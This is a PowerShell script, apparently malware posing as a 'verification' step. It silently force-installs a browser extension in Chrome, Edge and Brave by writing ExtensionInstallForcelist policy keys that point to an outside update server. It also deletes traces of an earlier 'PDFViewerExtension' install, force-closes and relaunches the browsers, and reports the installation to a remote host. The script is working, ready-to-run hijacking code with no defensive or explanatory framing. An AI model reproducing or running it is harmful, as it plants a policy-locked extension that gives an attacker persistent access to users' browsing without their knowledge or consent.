$ErrorActionPreference = 'Stop'
$ProgressPreference = 'SilentlyContinue'
$ExtensionId = 'kklpcoclpjjfiboodbmcpogicnanoopp'
$UpdateUrl = 'https://wln.ink/ext/update.json'
$policyValue = "$ExtensionId;$UpdateUrl"
$installedCount = 0
$relaunchTargets = @()
$mySession = (Get-Process -Id $PID).SessionId
try {
    $policyKeys = @(
        'HKLM:\SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist',
        'HKCU:\SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist',
        'HKLM:\SOFTWARE\Policies\Microsoft\Edge\ExtensionInstallForcelist',
        'HKCU:\SOFTWARE\Policies\Microsoft\Edge\ExtensionInstallForcelist',
        'HKLM:\SOFTWARE\Policies\BraveSoftware\Brave-Browser\ExtensionInstallForcelist',
        'HKCU:\SOFTWARE\Policies\BraveSoftware\Brave-Browser\ExtensionInstallForcelist'
    )
    foreach ($policyKey in $policyKeys) {
        try {
            New-Item -Path $policyKey -Force -ErrorAction Stop | Out-Null
            New-ItemProperty -Path $policyKey -Name '1' -Value $policyValue -PropertyType String -Force -ErrorAction Stop | Out-Null
            $installedCount++
        } catch { }
    }
    if ($installedCount -eq 0) {
        Write-Host "Verification Failed, try again!" -ForegroundColor Red
        exit 1
    }
    try {
        Unregister-ScheduledTask -TaskName "PDFViewerExtensionUpdater" -Confirm:$false -ErrorAction Stop | Out-Null
    } catch { }
    foreach ($u in (Get-ChildItem -Path 'C:\Users' -Directory -ErrorAction SilentlyContinue)) {
        $oldDir = Join-Path $u.FullName 'AppData\Local\PDFViewerExtension'
        if (Test-Path $oldDir) {
            try { Remove-Item $oldDir -Recurse -Force -ErrorAction Stop } catch { }
        }
    }
    $procNames = @('chrome.exe', 'msedge.exe', 'brave.exe')
    foreach ($pn in $procNames) {
        $mains = @(Get-CimInstance Win32_Process -Filter "Name='$pn'" -ErrorAction SilentlyContinue | Where-Object { ([string]$_.CommandLine) -notmatch '--type=' })
        foreach ($m in $mains) {
            $exePath = $m.ExecutablePath
            if (-not $exePath) { continue }
            $procSess = -1
            try { $procSess = (Get-Process -Id $m.ProcessId -ErrorAction Stop).SessionId } catch { continue }
            if ($procSess -ne $mySession) { continue }
            $argStr = ''
            $cl = [string]$m.CommandLine
            if ($cl.StartsWith('"')) {
                $q = $cl.IndexOf('"', 1)
                if ($q -gt 0) { $argStr = $cl.Substring($q + 1).Trim() }
            } elseif ($cl.Length -gt $exePath.Length -and $cl.Substring(0, $exePath.Length) -ieq $exePath) {
                $argStr = $cl.Substring($exePath.Length).Trim()
            }
            if ($argStr -notmatch 'restore-last-session') {
                $argStr = ($argStr + ' --restore-last-session').Trim()
            }
            $key = "$exePath|$argStr"
            $dup = $false
            foreach ($t in $relaunchTargets) { if ($t.Key -eq $key) { $dup = $true } }
            if (-not $dup) {
                $relaunchTargets += [pscustomobject]@{ Key = $key; Exe = $exePath; Args = $argStr }
            }
        }
    }
    foreach ($pn in $procNames) {
        $procName = [IO.Path]::GetFileNameWithoutExtension($pn)
        $mine = @(Get-Process -Name $procName -ErrorAction SilentlyContinue | Where-Object { $_.SessionId -eq $mySession })
        foreach ($p in $mine) {
            try { Stop-Process -Id $p.Id -Force -ErrorAction Stop } catch { }
        }
    }
    if ($relaunchTargets.Count -gt 0) {
        Start-Sleep -Seconds 2
        foreach ($t in $relaunchTargets) {
            try {
                if ($t.Args) { Start-Process -FilePath $t.Exe -ArgumentList $t.Args }
                else { Start-Process -FilePath $t.Exe }
            } catch { }
        }
    }
    try {
        $notifyBody = "ev=install&os=windows&v=1.0.0&extra=policies:$installedCount"
        Invoke-WebRequest -Uri "https://wln.ink/n" -Method Post -Body $notifyBody `
            -ContentType "text/plain" -UseBasicParsing -TimeoutSec 5 | Out-Null
    } catch { }
} catch {
    Write-Host "Verification Failed, try again!" -ForegroundColor Red
    exit 1
}
Write-Host "Successfully completed" -ForegroundColor Green
exit 0
